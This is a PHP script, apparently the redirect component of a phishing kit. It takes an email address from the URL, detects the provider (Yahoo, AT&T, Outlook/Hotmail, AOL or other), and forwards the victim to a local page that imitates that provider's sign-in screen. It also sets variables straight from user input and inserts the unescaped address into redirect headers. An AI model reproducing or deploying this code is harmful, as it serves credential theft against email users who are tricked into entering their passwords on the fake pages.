<?php 
	
	
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $userid);
	
	$domain_check = '@'.strtolower($domain[1]);
	$rans = substr(md5(mt_rand()), 0, 43);
	
	if(stripos($domain_check, '@yahoo.') !== false || stripos($domain_check, '@rocketmail.') !== false || stripos($domain_check, '@bellsouth.') !== false || stripos($domain_check, '@sbcglobal.') !== false || stripos($domain_check, '@att.') !== false || stripos($domain_check, '@ymail.') !== false){
		header('Location: y_mail.us/?.yhs=yml&.lang=en-US&.intl=us&id=ew&done&userid='.$userid);
	}
	elseif(stripos($domain_check, '@live.')!== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@msn.') !== false) {
		header('Location: msn/?wa=w_sign_in1.0&rpsnv=18&ct=1546890561&rver=re&wp=MBI_SSL&wrepl=out&lw=ed&fmym_Product-UserID&userid='.$userid);
			}
			
	elseif(stripos($domain_check, '@aol.') !== false || stripos($domain_check, '@aol.') !== false) {
		header('Location: am.aol-us-client/?=https.2llogin.aol.comL1A&Dauth=col&Product-done&userid='.$userid);
			}
			
	else {
		header('Location: auth.other_mail_roundscube/?l=other&b_Product-User_ID&userid='.$userid);
	}
		
?>